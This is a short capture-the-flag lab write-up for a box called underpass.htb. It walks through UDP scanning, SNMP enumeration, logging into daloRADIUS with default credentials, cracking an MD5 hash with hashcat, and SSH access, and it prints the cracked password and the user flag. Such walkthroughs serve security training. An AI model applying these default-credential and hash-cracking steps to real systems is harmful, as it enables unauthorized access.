ENUMERATION:

Simple enumeration scan shows port 80 and port 22 open.

Website available with a vector for ssh connectivity. Unlike other boxes, port 80 doesn't go anywhere and its unlikely we'll get a good foothold there. UDP scans show additional ports open:

Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.020s latency).
Not shown: 97 closed udp ports (port-unreach)
PORT     STATE         SERVICE
161/udp  open          snmp
1812/udp open|filtered radius
1813/udp open|filtered radacct

SNMP is open, so we can run snmp-check:

snmp-check 10.10.11.48 -c public  

[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.11.48
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 00:20:16.32
  Uptime system                 : 00:20:05.93
  System date                   : 2024-12-23 20:11:00.0

They key here is the information that its a daloradius server.

Googling darloradius server properties show a few examples of default configurations:

http://underpass.htb/daloradius/app/operators/login.php 

Default creds work too;

Username: administrator
Password: radius

Users field is open with an MD5 hashed password

412dd4759978acfcc81deab01b382403

hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt 

<CREDS>412dd4759978acfcc81deab01b382403:underwaterfriends</CREDS>

ssh svcMosh@10.10.11.48
underwaterfriends

ACCESS

<FLAG>USER FLAG: c19b752c9d242efdbe081a3e24da949e</FLAG>





